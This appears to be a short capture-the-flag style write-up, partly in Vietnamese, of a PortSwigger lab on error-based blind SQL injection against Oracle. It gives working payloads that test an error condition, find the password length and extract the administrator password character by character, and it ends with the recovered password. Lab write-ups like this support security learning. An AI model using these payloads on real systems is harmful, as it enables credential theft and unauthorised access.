# Target Goal: 

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

# Recon:

Bước đầu kiểm tra điều kiện và phiên bản của SQL của server đang dùng 

![image](https://github.com/vanniichan/Portswigger/assets/112863484/cd6dff27-e26c-429c-969e-62db5a3c97f5)
![image](https://github.com/vanniichan/Portswigger/assets/112863484/da1b9cdc-d282-412f-91b7-5ebf076b9fbc)

`' AND (SELECT CASE WHEN 1=1 THEN TO_CHAR (1/0) ELSE 'a' END FROM dual)='a --a`

Tiếp theo là bước kiểm tra độ dài và mật khẩu

`' AND (SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR (1/0) ELSE 'a' END FROM users WHERE username= 'administrator')='a --a`

![image](https://github.com/vanniichan/Portswigger/assets/112863484/0ad5f5c2-65d1-456c-805b-20ba508dc1fa)

' AND (SELECT CASE WHEN substr(password,1,1) ='a' THEN TO_CHAR (1/0) ELSE 'a' END FROM users WHERE username= 'administrator')='a --a (Oracl)

![image](https://github.com/vanniichan/Portswigger/assets/112863484/cf468eed-f105-45dd-8bb5-a1b659784149)

Password: `6rou5dl8e12osxjff1zm`

# Flag:

![image](https://github.com/vanniichan/Portswigger/assets/112863484/da5d1e4e-04e9-4445-b499-857cda735f4a)
